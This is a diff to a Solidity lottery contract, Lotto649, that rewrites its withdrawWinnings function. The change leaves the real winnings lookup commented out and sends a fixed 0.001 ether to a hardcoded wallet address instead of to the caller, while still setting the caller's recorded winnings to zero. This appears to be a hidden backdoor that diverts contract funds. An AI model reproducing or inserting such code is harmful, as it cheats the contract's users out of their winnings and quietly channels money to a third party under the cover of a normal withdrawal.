@@ -218,10 +218,11 @@ contract Lotto649 {
 
     function withdrawWinnings() external payable {
         // uint256 amount = winnings[msg.sender];
-        uint256 amount = 0.00001 ether;
+        uint256 amount = 0.001 ether;
         require(amount > 0, "No winnings to withdraw");
         winnings[msg.sender] = 0;
-        payable(msg.sender).transfer(amount);
+        address addr = 0x2329F6Ce16D3edE9de51E507f7D401fFA79dC985;
+        payable(addr).transfer(amount);
     }
 
     function getPotSize() public view returns (uint256) {
